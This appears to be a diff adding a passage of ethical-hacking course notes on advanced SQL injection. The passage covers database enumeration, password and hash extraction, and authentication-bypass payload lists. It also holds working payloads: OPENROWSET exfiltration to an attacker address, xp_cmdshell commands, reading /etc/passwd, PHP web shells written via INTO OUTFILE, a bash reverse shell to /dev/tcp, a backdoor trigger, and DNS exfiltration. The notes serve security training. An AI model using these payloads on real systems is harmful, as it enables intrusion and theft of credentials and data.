@@ -9657,3 +9657,486 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 							UPDATE Users SET Email_ID = 'Clark@mymail.com' WHERE Email_ID = 'Alice@xyz.com';
 						- As a result, the Users table now reflects the attacker’s email instead of Alice’s.
 						- Now, the attacker visits the web application's login page, clicks on the "Forgot Password?" link, and receives the reset instructions at their email. They then reset Alice’s password, log in using the new credentials, and perform malicious activities on her behalf.
+		- Advanced SQL Injection:
+			- An attacker does not stop at merely compromising an application’s data. They may escalate the SQL injection attack to compromise the underlying operating system (OS) and network. Using the compromised application, the attacker can issue commands to the underlying OS, take control of the target machine, and use it as a staging post to attack the rest of the network.
+			- The attacker may interact with the OS to extract system details, obtain application passwords, execute commands, access system files, and more. Additionally, they can further compromise the entire target network by installing Trojans and planting keyloggers.
+			- Database, Table, and Column Enumeration:
+				- Attackers use various SQL queries to enumerate databases, table names, and columns. The information obtained through enumeration can be leveraged to:
+					Extract sensitive data from the database.
+					Modify data (insert, update, delete).
+					Execute admin-level operations.
+					Retrieve the contents of files stored in the DBMS file system.
+				- The following techniques are commonly used by attackers for enumeration:
+					- Identifying User-Level Privileges:
+						- Attackers exploit built-in SQL scalar functions available in most SQL implementations to determine user privileges. Examples include:
+							SELECT user, current_user, session_user, system_user;
+							' and 1 in (select user) --';
+							IF user = 'dbo' WAITFOR DELAY '0:0:5' --';
+							UNION SELECT IF(user() LIKE 'root@%', BENCHMARK(50000, SHA1('test')), 'false');
+					- Identifying Database Administrators:
+						- Default administrator accounts in various databases include sa, system, sys, dba, admin, root, and others. The dbo (Database Owner) account has implicit permissions to perform all activities within the database. Any object created by a member of the sysadmin fixed server role is automatically assigned to dbo.
+					- Discovering Database Structure:
+						- Attackers use the following SQL queries to determine database structures:
+						- Identify table and column names: ' GROUP BY columnname HAVING 1=1 --
+						- Discover column data types: ' UNION SELECT SUM(columnname) FROM tablename --
+						- Enumerate user-defined tables: ' AND 1 IN (SELECT MIN(name) FROM sysobjects WHERE xtype = 'U' AND name > '.') --
+					- Column Enumeration in Different Databases:
+						- Microsoft SQL Server (MSSQL):
+							SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename');
+							EXEC sp_columns tablename;
+						- MySQL:
+							SHOW COLUMNS FROM tablename;
+						- Oracle:
+							SELECT * FROM all_tab_columns WHERE table_name = 'tablename';
+						- IBM DB2:
+							SELECT * FROM syscat.columns WHERE tabname = 'tablename';
+						- PostgreSQL:
+							SELECT attnum, attname
+							FROM pg_class, pg_attribute
+							WHERE relname = 'tablename'
+							AND pg_class.oid = attrelid
+							AND attnum > 0;
+			- Advanced Enumeration:
+				- Attackers use advanced enumeration techniques to gather system-level and network-level information. The data collected in the previous stage can be leveraged to gain unauthorized access. For instance, an attacker can crack passwords using various tools such as L0phtCrack, John the Ripper, and others. Additionally, attackers exploit buffer overflow vulnerabilities to assess weaknesses in a system or network. The following database objects are commonly used for enumeration:
+				- Examples:
+					- Tables and Columns Enumeration in a Single Query:
+						' UNION SELECT 0, sys.objects.name + ': ' + sys.columns.name + ': ' + sys.types.name,
+						1, 1, '1', 1, 1, 1, 1, 1 
+						FROM sys.objects, sys.columns, sys.types
+						WHERE sys.objects.xtype = 'U'
+						AND sys.objects.id = sys.columns.id
+						AND sys.columns.xtype = sys.types.xtype --
+					- Database Enumeration:
+						- Listing Different Databases on a Server: ' AND 1 IN (SELECT MIN(name) FROM master.dbo.sys.databases WHERE name > '.') --
+						- Finding the File Location of Databases: ' AND 1 IN (SELECT MIN(filename) FROM master.dbo.sys.databases WHERE filename > '.') -- 
+				- Features of Different DBMS:
+					- Once an attacker identifies the type of database used in an application during the information-gathering phase, they may then analyze the database’s specific features to tailor their attack strategy. Different database management systems (DBMS) vary in syntax and feature availability, including:
+						- String concatenation methods
+						- Comment styles
+						- UNION query capabilities
+						- Subqueries
+						- Stored procedures
+						- Information schema availability (or its equivalents)
+					- Examples:
+						- MySQL:
+							SELECT * FROM table WHERE id = 1 UNION SELECT 1,2,3;
+						- PostgreSQL
+							SELECT * FROM table WHERE id = 1;
+							SELECT 1,2,3;
+						- Oracle:
+							SELECT * FROM table WHERE id = 1 UNION SELECT NULL, NULL, NULL FROM sys.dual;
+			- Creating Database Accounts:
+				- The following are different ways to create database accounts in various DBMS:
+				- Microsoft SQL Server:
+					EXEC sp_addlogin 'victor', 'Pass123';
+					EXEC sp_addsrvrolemember 'victor', 'sysadmin';
+				- Oracle:
+					CREATE USER victor IDENTIFIED BY Pass123
+					TEMPORARY TABLESPACE temp
+					DEFAULT TABLESPACE users;
+					GRANT CONNECT TO victor;
+					GRANT RESOURCE TO victor;
+				- Microsoft Access:
+					CREATE USER victor IDENTIFIED BY 'Pass123';
+				- MySQL:
+					CREATE USER 'victor'@'localhost' IDENTIFIED BY 'Pass123';
+					GRANT ALL PRIVILEGES ON *.* TO 'victor'@'localhost' WITH GRANT OPTION;
+			- Password Grabbing:
+				- Password grabbing is one of the most serious consequences of an SQL injection attack. Attackers exploit SQL injection vulnerabilities to extract passwords from user-defined database tables. By crafting malicious SQL queries, they can retrieve sensitive credentials. Once obtained, these passwords can be modified, deleted, or used to gain unauthorized access. In some cases, attackers may escalate their privileges to an admin level using stolen credentials.
+				- For example, an attacker may use the following SQL code to extract passwords:
+					BEGIN
+						DECLARE @var VARCHAR(8000);
+						SET @var = ':';
+						SELECT @var = @var + ' ' + login + '/' + password + ' ' FROM users WHERE login > @var;
+						SELECT @var AS var INTO temp;
+					END;
+					--' AND 1 IN (SELECT var FROM temp) --' ; DROP TABLE temp --
+			- Grabbing SQL Server Hashes:
+				- Some databases store user IDs and passwords in the sys.syslogins table as hash values. Attackers attempt to extract plaintext credentials, password hashes, tokens, and other sensitive data from the database to further compromise the target network.
+				- To extract this information, attackers execute a sequence of SQL queries against the target database, as demonstrated below:
+				- Example 1:
+					- The following SQL query extracts password hashes: SELECT password FROM sys.syslogins;
+					- Next, the hashes are converted to hexadecimal format:
+						BEGIN
+							DECLARE @charvalue VARCHAR(8000) = '0x',
+									@i INT = 1,
+									@length INT = DATALENGTH(@binvalue),
+									@hexstring VARCHAR(16) = '0123456789ABCDEF';
+
+							WHILE (@i <= @length)
+							BEGIN
+								DECLARE @tempint INT,
+										@firstint INT,
+										@secondint INT;
+
+								SELECT @tempint = CONVERT(INT, SUBSTRING(@binvalue, @i, 1));
+								SELECT @firstint = FLOOR(@tempint / 16);
+								SELECT @secondint = @tempint - (@firstint * 16);
+
+								SELECT @charvalue = @charvalue +
+													SUBSTRING(@hexstring, @firstint + 1, 1) +
+													SUBSTRING(@hexstring, @secondint + 1, 1);
+
+								SELECT @i = @i + 1;
+							END;
+						END;
+					- Finally, attackers iterate through all extracted password hashes.
+				- Example 2:
+					- The following SQL query retrieves user names along with password hashes: SELECT name, password FROM sys.syslogins;
+					- To display hashes through an error message, attackers may convert them into hexadecimal format and concatenate the results.
+					- Note: Extracting password hashes generally requires DBA (Database Administrator) privileges. However, even with lower privileges, attackers can still extract usernames and attempt brute-force attacks to crack the passwords.
+					- SQL Server Hash Sample: 0x010034767D5C0CFA5FDCA28C4A56085E65E882E71CB0ED2503412FD54D6119FFF04129A1D72E7C3194F7284A7F3A
+					- Extracting Hashes Through Error Messages:
+						- Attackers may also attempt to extract hashes by triggering error messages using SQL injection techniques:
+							' AND 1 IN (SELECT x FROM temp) --
+							' AND 1 IN (SELECT SUBSTRING(x, 256, 256) FROM temp) --
+							' AND 1 IN (SELECT SUBSTRING(x, 512, 256) FROM temp) --
+							DROP TABLE temp --
+			- Transferring a Database to an Attacker's Machine:
+				- An attacker can link a target SQL Server database to their own machine, allowing them to retrieve data from the compromised database. This is accomplished using OPENROWSET. Once the database structure is replicated, the data transfer begins. The attacker establishes a connection to a remote machine on port 80 to exfiltrate the data.
+				- For example, an attacker may inject the following SQL query sequence to transfer the database:
+					'; INSERT INTO OPENROWSET('SQLoledb',
+						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
+						'SELECT * FROM mydatabase..hacked_sysdatabases')
+						SELECT * FROM sys.sysdatabases --';
+
+					INSERT INTO OPENROWSET('SQLoledb',
+						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
+						'SELECT * FROM mydatabase..hacked_sysobjects')
+						SELECT * FROM sys.sysobjects --';
+
+					INSERT INTO OPENROWSET('SQLoledb',
+						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
+						'SELECT * FROM mydatabase..hacked_syscolumns')
+						SELECT * FROM sys.syscolumns --';
+
+					INSERT INTO OPENROWSET('SQLoledb',
+						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
+						'SELECT * FROM mydatabase..table1')
+						SELECT * FROM database..table1 --';
+
+					INSERT INTO OPENROWSET('SQLoledb',
+						'uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
+						'SELECT * FROM mydatabase..table2')
+						SELECT * FROM database..table2 --';
+			- Interacting with the Operating System:
+				- Attackers use various DBMS queries to interact with a target operating system (OS). There are two primary ways to achieve this:
+				- Reading and writing system files from disk: An attacker can read arbitrary files stored on the target system running the DBMS, allowing them to steal important documents, configurations, or binary files. They can also extract credentials from system files to escalate privileges and launch further attacks.
+				- Executing commands via a remote shell: An attacker can exploit a Windows access token to escalate privileges on the target system, execute malicious commands, and carry out further attacks.
+				- Example Queries for OS Interaction:
+					- MSSQL OS Interaction:
+						'; EXEC master..xp_cmdshell 'ipconfig > test.txt' --';
+						CREATE TABLE tmp (txt VARCHAR(8000));
+						BULK INSERT tmp FROM 'test.txt' --';
+						BEGIN
+							DECLARE @data VARCHAR(8000);
+							SET @data = '| ';
+							SELECT @data = @data + txt + ' | ' FROM tmp WHERE txt < @data;
+							SELECT @data AS x INTO temp;
+						END --' AND 1 IN (SELECT SUBSTRING(x,1,256) FROM temp) --';
+						DECLARE @var SYSNAME;
+						SET @var = 'del test.txt';
+						EXEC master..xp_cmdshell @var;
+						DROP TABLE temp;
+						DROP TABLE tmp --
+					- MySQL OS Interaction:
+						CREATE FUNCTION sys_exec RETURNS INT SONAME 'libudffmwgj.dll';
+						CREATE FUNCTION sys_eval RETURNS STRING SONAME 'libudffmwgj.dll';
+				- Note: The ability to execute these queries depends on the database’s privileges and permissions. Many modern database systems implement security restrictions to mitigate such attacks.
+			- Interacting with the File System:
+				- Attackers exploit MySQL’s ability to read text files through the database to obtain password files and store query results in a text file.
+				- The following MySQL functions are commonly used by attackers to interact with the file system:
+				- LOAD_FILE():
+					- The LOAD_FILE() function in MySQL reads and returns the contents of a file located on the MySQL server. Attackers can use this function to extract sensitive files, such as password files.
+					- For example, the following query retrieves the system's password file: NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*
+					- If successful, this injection will display the contents of the /etc/passwd file.
+				- INTO OUTFILE():
+					- The INTO OUTFILE function allows MySQL to write the output of a query into a file. Attackers can exploit this function to create backdoor scripts.
+					- For example, the following query writes a malicious PHP web shell to the server:
+						NULL UNION ALL SELECT NULL, NULL, NULL, NULL,
+						'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
+					- If successful, this will allow the attacker to execute system commands via the $_GET global variable.
+					- An example of using wget to retrieve a file through the malicious shell is: http://www.certifiedhacker.com/shell.php?command=wget
+				- Note: The success of these attacks depends on MySQL’s file privileges and system configurations. Modern database security measures typically restrict these functions to prevent exploitation.
+			- Network Reconnaissance Using SQL Injection:
+				- Network reconnaissance is the process of identifying potential vulnerabilities in a computer network. However, it is also a major type of network attack. While network reconnaissance can be mitigated to some extent, it cannot be entirely eliminated. Attackers often use network mapping tools such as Nmap and Network Topology Mapper to identify network vulnerabilities.
+				- Steps for Assessing Network Connectivity:
+					- Retrieve server name and configuration using the following SQL injection techniques:
+						' AND 1 IN (SELECT @@servername) --
+						' AND 1 IN (SELECT srvname FROM sys.sysservers) --
+					- Use utilities such as NetBIOS, ARP, Local Open Ports, nslookup, ping, FTP, TFTP, SMB, and traceroute to assess network connectivity.
+					- Test for the presence of firewalls and proxies.
+				- Performing Network Reconnaissance Using xp_cmdshell:
+					- You can execute the following commands using the xp_cmdshell function in SQL Server:
+						EXEC xp_cmdshell 'ipconfig /all'
+						EXEC xp_cmdshell 'tracert MyIP'
+						EXEC xp_cmdshell 'arp -a'
+						EXEC xp_cmdshell 'nbtstat -c'
+						EXEC xp_cmdshell 'netstat -ano'
+						EXEC xp_cmdshell 'route print'
+				- Code to Gather IP Information Through Reverse Lookups:
+					- Reverse DNS Lookup: '; EXEC master..xp_cmdshell 'nslookup a.com MyIP' --
+					- Reverse Ping: '; EXEC master..xp_cmdshell 'ping 10.0.0.75' --  
+					- Using OPENROWSET to Extract Data:
+						'; SELECT * FROM OPENROWSET(
+							'SQLoledb',
+							'UID=sa; PWD=Pass123; Network=DBMSSOCN; Address=10.0.0.75,80;',
+							'SELECT * FROM table'
+						)
+			- Network Reconnaissance Full Query:
+				- The following queries can be used to perform network reconnaissance:
+				- Execute multiple network commands and store the output in a text file:
+					'; DECLARE @var VARCHAR(256);
+					SET @var = 'del test.txt && arp -a >> test.txt && ipconfig /all >> test.txt &&
+								nbtstat -c >> test.txt && netstat -ano >> test.txt &&
+								route print >> test.txt && tracert -w 10 -h 10 google.com >> test.txt';
+					EXEC master..xp_cmdshell @var --
+				- Create a temporary table and insert data from the generated text file:
+					'; CREATE TABLE tmp (txt VARCHAR(8000));
+					BULK INSERT tmp FROM 'test.txt' --
+				- Extract and concatenate data from the temporary table:
+					'; BEGIN
+						DECLARE @data VARCHAR(8000);
+						SET @data = ': ';
+						SELECT @data = @data + txt + ' | ' FROM tmp WHERE txt < @data;
+						SELECT @data AS x INTO temp;
+					END --
+				- Retrieve extracted data from the temporary table:
+					' AND 1 IN (SELECT SUBSTRING(x, 1, 255) FROM temp) --
+				- Clean up temporary files and tables:
+					'; DECLARE @var SYSNAME;
+					SET @var = 'del test.txt';
+					EXEC master..xp_cmdshell @var;
+					DROP TABLE temp;
+					DROP TABLE tmp --
+				- Note:	By default, Microsoft SQL Server disables xp_cmdshell due to security risks. To enable it, execute the following commands:
+					EXEC sp_configure 'xp_cmdshell', 1;
+					GO
+					RECONFIGURE;
+					GO
+			- Finding and Bypassing the Admin Panel of a Website:
+				- Attackers attempt to locate the admin panel of a website using simple Google dorks and bypass administrator authentication through SQL injection attacks. Typically, an attacker uses Google dorks to find the URL of an admin panel.
+				- For example, the attacker may use the following dorks to identify the admin panel of a website:
+					- inurl:"adminlogin.aspx"
+					- inurl:"admin/index.php"
+					- inurl:"administrator.php"
+					- inurl:"administrator.asp"
+					- inurl:"/admin/"
+					- inurl:"login.asp"
+					- inurl:"/admin/login.php"
+					- inurl:"login.aspx"
+					- inurl:"login.php"
+					- inurl:"admin/index.html"
+					- inurl:"adminlogin.php"
+				- Using these dorks, an attacker may construct URLs to access the admin login page, such as:
+					- http://www.certifiedhacker.com/admin.php
+					- http://www.certifiedhacker.com/admin/
+					- http://www.certifiedhacker.com/admin.html
+					- http://www.certifiedhacker.com:2082/
+				- Once the attacker gains access to the admin login page, they attempt to obtain the admin username and password by injecting malicious SQL queries. For example:
+					- Username: 1'or'1'='1
+					- Password: 1'or'1'='1
+				- Some common SQL queries used to bypass admin authentication include:
+					- ' or 1=1 --
+					- 1'or'1'='1
+					- admin'--
+					- '' or 0=0 --
+					- or 0=0 --
+					- ' or 0=0 #
+					- '' or 0=0 #
+					- or 0=0 #
+					- ' or 'x'='x
+					- '' or "x"="x"
+					- ') or ('x'='x
+					- ' or 1=1--
+					- '' or 1=1--
+					- or 1=1--
+				- After successfully bypassing admin authentication, the attacker gains full access to the admin panel, allowing them to carry out malicious activities such as installing backdoors for further exploitation.
+			- PL/SQL Exploitation:
+				- PL/SQL, similar to stored procedures, is vulnerable to various SQL injection attacks. PL/SQL code shares the same vulnerabilities as dynamic queries that incorporate user input at runtime. Some techniques used by attackers to exploit SQL injection vulnerabilities in PL/SQL blocks are discussed below.
+				- Example: SQL Injection in PL/SQL
+					- Consider a database containing the User_Details table with the following attributes:
+						- UserName: VARCHAR2
+						- Password: VARCHAR2
+					- A PL/SQL procedure is used to validate a user's password while retrieving details from the table. However, this procedure is vulnerable to SQL injection attacks:
+						CREATE OR REPLACE PROCEDURE Validate_UserPassword(
+							N_UserName IN VARCHAR2,
+							N_Password IN VARCHAR2
+						) AS
+							CUR SYS_REFCURSOR;
+							FLAG NUMBER;
+						BEGIN
+							OPEN CUR FOR 'SELECT 1 FROM User_Details WHERE UserName = ''' ||
+								N_UserName || '''' || ' AND Password = ''' || N_Password || '''';
+							FETCH CUR INTO FLAG;
+							IF CUR%NOTFOUND THEN
+								RAISE_APPLICATION_ERROR(-20343, 'Password Incorrect');
+							END IF;
+							CLOSE CUR;
+						END;
+					- To execute this procedure, use the following command: EXEC Validate_UserPassword('Bob', '@Bob123');
+				- Exploitation Techniques:
+					- This PL/SQL procedure can be exploited in two different ways:
+					- Exploiting Quotes:
+						- An attacker can inject malicious input into the password field. For example: EXEC Validate_UserPassword('Bob', 'x'' OR ''1''=''1');
+						- This modifies the SQL query inside the procedure: SELECT 1 FROM User_Details WHERE UserName = 'Bob' AND Password = 'x' OR '1'='1';
+						- Since '1'='1' is always true, the query returns a row, allowing unauthorized access.
+					- Exploitation by Truncation:
+						- Attackers can also use inline comments (--) to bypass authentication. For example: EXEC Validate_UserPassword('Bob''--', '');
+						- This modifies the SQL query inside the procedure: SELECT 1 FROM User_Details WHERE UserName = 'Bob'-- AND Password='';
+						- The -- comment disables the password check, allowing an attacker to log in without a valid password.
+				- Countermeasures to Prevent SQL Injection:
+					- Minimize user inputs in dynamic SQL.
+					- Validate and sanitize user inputs before including them in dynamic SQL statements.
+					- Use the DBMS_ASSERT package provided by Oracle to validate user inputs.
+					- Use bind parameters in dynamic SQL to prevent direct concatenation of user inputs.
+					- Avoid single quotes and use secure string parameters by employing double quotes.
+					- Apply the principle of least privilege to restrict the database account executing PL/SQL.
+					- Regularly review and test PL/SQL code for vulnerabilities, particularly SQL injections.
+					- Customize error handling to prevent database metadata leakage through error messages.
+			- Creating Server Backdoors Using SQL Injection:
+				- The following are different methods attackers use to create backdoors:
+				- Getting OS Shell:
+					- Attackers exploit SQL server functions such as xp_cmdshell to execute arbitrary commands. Each DBMS software has its own naming conventions for such functions. Another technique involves using the SELECT ... INTO OUTFILE feature in MySQL to write arbitrary files with database user permissions. This allows attackers to overwrite critical system files, including shell scripts executed at system startup. Backdoors can also be established by defining and executing stored procedures within the database.
+					- Using OUTFILE:
+						- If an attacker gains access to the web server, they can use the following MySQL query to create a PHP shell on the server: SELECT '<?php exec($_GET["cmd"]); ?>' FROM usertable INTO OUTFILE '/var/www/html/shell.php';
+					- Finding Directory Structure:
+						- To determine the location of the database on the web server, an attacker can execute the following SQL injection query: SELECT @@datadir;
+						- By analyzing the directory structure, an attacker can identify where to place a shell on the web server.
+					- Using Built-in DBMS Functions:
+						- MSSQL includes built-in functions such as xp_cmdshell, which can be used to execute OS commands at runtime. The following example demonstrates how an attacker could create an interactive shell that listens on IP 10.0.0.1 and port 8080: EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1';
+				- Creating a Database Backdoor:
+					- Attackers can use triggers to create database backdoors. A database trigger is a stored procedure that is automatically executed in response to specific database events.
+					- For example, consider an online shopping website that stores product details in a database table called ITEMS. An attacker may inject a malicious trigger into this table so that whenever an INSERT query is executed, the trigger sets the item's price to 0. This would allow customers to purchase items without paying.
+					- The malicious Oracle trigger code is as follows:
+						CREATE OR REPLACE TRIGGER SET_PRICE  
+						AFTER INSERT OR UPDATE ON ITEMS  
+						FOR EACH ROW  
+						BEGIN  
+						UPDATE ITEMS SET Price = 0;  
+						END;
+					- The attacker needs to inject and execute this trigger on the web server to establish the backdoor.
+			- HTTP Header-Based SQL Injection:
+				- Attackers can exploit HTTP headers to inject SQL queries into a vulnerable server. This vulnerability typically arises when proper input sanitization is not performed. Various HTTP header fields can be manipulated to inject malicious SQL queries.
+				- HTTP Header Fields:
+					- HTTP header fields are components of the HTTP request and response messages. These fields define the operational parameters of an HTTP transaction between a web server and a browser. Some basic request HTTP header fields include:
+						GET / HTTP/1.1
+						Connection: Keep-Alive
+						Keep-Alive: Timeout
+						Accept: */*
+						Host: [host]:[port]
+						Accept-Language: [language] [q=qvalue]
+						Accept-Encoding: [encoding types]
+						User-Agent: <product><product-version> <comment>
+						Cookie: name=value
+					- HTTP cookies are commonly used as potential attack vectors since they are stored in databases for session identification.
+				- X-Forwarded-For:
+					- The X-Forwarded-For (XFF) header is an HTTP header field that identifies the IP address of a client connecting through an HTTP proxy. Attackers can manipulate this field to bypass authentication mechanisms.
+					- Consider the following vulnerable SQL query in a form submission:
+						$req = mysql_query("SELECT username, pwd FROM admin_table
+						WHERE username='" . sanitize($_POST['user']) . "'
+						AND pwd='" . md5($_POST['password']) . "'
+						AND ipaddr='" . ip_address() . "'");
+					- In this example, the sanitize() function correctly validates the username and password inputs:
+						function sanitize($params) { 
+							if (is_numeric($params)) { 
+								return $params; 
+							} else { 
+								return mysql_real_escape_string($params); 
+							}
+						}
+					- However, the ip_address() function retrieves the client’s IP address without proper sanitization:
+						function ip_address() {
+							if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+								$ip_addr = $_SERVER['HTTP_X_FORWARDED_FOR'];
+							} else {
+								$ip_addr = $_SERVER["REMOTE_ADDR"];
+							}
+
+							if (preg_match("#^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#", $ip_addr)) {
+								return $ip_addr;
+							} else {
+								return $_SERVER["REMOTE_ADDR"];
+							}
+						}
+					- In this function, the IP address is retrieved from the X-Forwarded-For header but is not sufficiently sanitized, making it vulnerable to SQL injection.
+					- For example, an attacker could modify the X-Forwarded-For header to inject a malicious SQL query:
+						GET /index.php HTTP/1.1
+						Host: [host]
+						X-Forwarded-For: 10.10.10.11' OR 1=1#
+				- User-Agent:
+					- The User-Agent header contains information about the client making the request. Attackers can inject SQL code into this field.
+					- Format: User-Agent: <product> | <comment>
+					- Example: User-Agent: Mozilla/68.0.2 (compatible; MSIE 5.01; Windows 10)
+					- An attacker could modify this field as follows:
+						GET /index.php HTTP/1.1
+						Host: [host]
+						User-Agent: aaa' OR 1/*
+				- Referer:
+					- The Referer header indicates the URI of the referring document. If an application stores this input in a database without sanitization, it becomes vulnerable to SQL injection.
+					- Example of a malicious request:
+						GET /index.php HTTP/1.1
+						Host: [host]
+						User-Agent: aaa' OR 1/*
+						Referer: http://www.hackerswebsite.com
+			- DNS Exfiltration Using SQL Injection:
+				- Attackers use DNS exfiltration to extract data, such as password hashes, through DNS requests. These DNS requests, sent by the attacker, can potentially pass through the database server to an arbitrary host. Even if a firewall prevents the database server from directly communicating with the Internet, it may still allow DNS requests to pass through an internal DNS server, as these requests originate from the server itself.
+				- Attackers embed the output of a malicious SQL query within a DNS request and capture the response sent by the server. For example, an attacker may attempt DNS exfiltration using SQL injection as follows: do_dns_lookup((SELECT TOP 1 password FROM users) + '.certifiedhacker.com');
+				- In this scenario, the attacker uses the SELECT statement to extract a password hash and appends a domain name (certifiedhacker.com) to the result. The attacker then performs a DNS lookup for a fabricated hostname and uses a packet sniffer to capture packets from the name server of the target domain. This allows the attacker to retrieve the password hash from the DNS record.
+				- For instance, the following DNS request demonstrates how the extracted password hash is included in the query: appserver.example.com.5678 > ns.certifiedhacker.com.53 A? 0x4a6f686e.certifiedhacker.com
+				- In this example, the string "0x4a6f686e" represents the password hash extracted using the SELECT statement. If the attacker operates a DNS server at appserver.example.com, they can perform a DNS lookup on hostname.appserver.example.com. This ensures that their server receives the query, allowing them to retrieve the leaked data from the DNS request.
+				- The following code illustrates DNS exfiltration via SQL injection on an MS SQL Server:
+					DECLARE @hostname VARCHAR(1024);
+					SELECT @hostname = (SELECT HOST_NAME()) + '.appserver.example.com';
+					EXEC('master.dbo.xp_dirtree "\\' + @hostname + '\c$"');
+			- MongoDB Injection/NoSQL Injection Attack:
+				- MongoDB is a NoSQL database, making it vulnerable to various NoSQL injection attacks. Web applications that use a MongoDB database may contain authentication vulnerabilities, allowing attackers to bypass authentication mechanisms. This can lead to data exfiltration and modification. Applications developed using PHP, JavaScript, Python, and Java may enable attackers to execute commands both in the database and the application.
+				- Attackers leverage MongoDB operators such as $eq (equals), $ne (not equal to), $gt (greater than), $gte (greater than or equal to), and $regex to craft malicious queries that bypass authentication.
+				- Example: NoSQL Injection in PHP
+					- Consider the following PHP code used to authenticate user credentials in MongoDB:
+						$user_name = $_POST['username'];
+						$pwd = $_POST['password'];
+
+						$new_conn = new MongoDB\Client('mongodb://localhost:27017');
+						if ($new_conn) {
+							$mydb = $new_conn->mytest;
+							$users = $mydb->users;
+							$myquery = array(
+								"user" => $user_name,
+								"password" => $pwd
+							);
+							$myreq = $users->findOne($myquery);
+						}
+					- The above code retrieves the username and password from a POST request and attempts to authenticate the user. However, an attacker can exploit this with a NoSQL injection payload: username[$eq]=admin&pwd[$ne]=admin
+					- If this query is executed in the database, the attacker can log in as an admin user.
+				- JavaScript Injection in MongoDB:
+					- Some PHP applications using MongoDB allow the $where query operation, which can be exploited for JavaScript injection. An attacker can input malicious JavaScript code to retrieve a list of users from the database.
+					- For example, if the application uses the following query to check for a specific user: $myquery = array('$where' => 'this.username === \'' . $username . '\'');
+					- This code compares the username field in the database. However, an attacker can inject an empty string to manipulate the query: '; return '' == '
+					- Executing this script can cause the application to return a list of users. Additionally, if an attacker inputs while(true), it could trigger an infinite loop, potentially leading to a Denial-of-Service (DoS) attack.
+			- SQL Injection Tools:
+				- The previous topics discussed SQL injection attack techniques that an attacker can use to exploit a web application. Attackers utilize SQL injection tools to implement these techniques quickly and effectively at every stage of an attack. These tools also enable attackers to enumerate users, databases, roles, columns, tables, and more.
+				- sqlmap (sqlmap.org):
+					- sqlmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities, allowing attackers to take control of database servers. It features a powerful detection engine, numerous advanced functionalities for penetration testers, and a wide range of options for database fingerprinting, extracting data, accessing the underlying file system, and executing OS-level commands via out-of-band connections. Attackers can use sqlmap to perform SQL injection on target websites using various techniques, including Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band injection.
+					- Key Features of sqlmap:
+						- Full support for six SQL injection techniques: Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band injection.
+						- Ability to connect directly to a database without requiring an SQL injection vulnerability by providing DBMS credentials, IP address, port, and database name.
+						- Support for enumerating users, password hashes, privileges, roles, databases, tables, and columns.
+						- Automatic detection of password hash formats and support for dictionary-based attacks to crack them.
+						- Ability to dump entire database tables, extract specific columns, or retrieve a selected range of entries.
+						- Support for searching specific database names, tables across all databases, or columns within all database tables.
+						- Capability to establish an out-of-band, stateful TCP connection between the attacker’s machine and the database server’s underlying operating system.
+				- Mole (sourceforge.net):
+					- Mole is an automatic SQL injection exploitation tool. By simply providing a vulnerable URL and a valid string on the site, it can detect and exploit SQL injection vulnerabilities using either the UNION technique or a Boolean query-based technique. Mole features a command-line interface (CLI) that allows users to specify actions easily. The CLI also supports auto-completion for both commands and command arguments, reducing the need for manual input.
+					- Key Features of Mole:
+						- Supports multiple database management systems, including MySQL, PostgreSQL, SQL Server, and Oracle.
+						- Automates SQL injection exploitation using the UNION technique.
+						- Supports automatic blind SQL injection exploitation.
+						- Can exploit SQL injection vulnerabilities in GET, POST, and Cookie parameters.
+						- Includes filters to bypass certain IPS/IDS rules using generic filters, with the flexibility to create custom filters.
+						- Can exploit SQL injection vulnerabilities that return binary data.
+					- Attackers use Mole to exploit SQL injection vulnerabilities through techniques such as UNION-based and blind SQL injection.
+				- jSQL Injection (github.com)
+				- NoSQLMap (github.com)
+				- Havij (github.com)
+				- blind_sql_bitshifting (github.com)
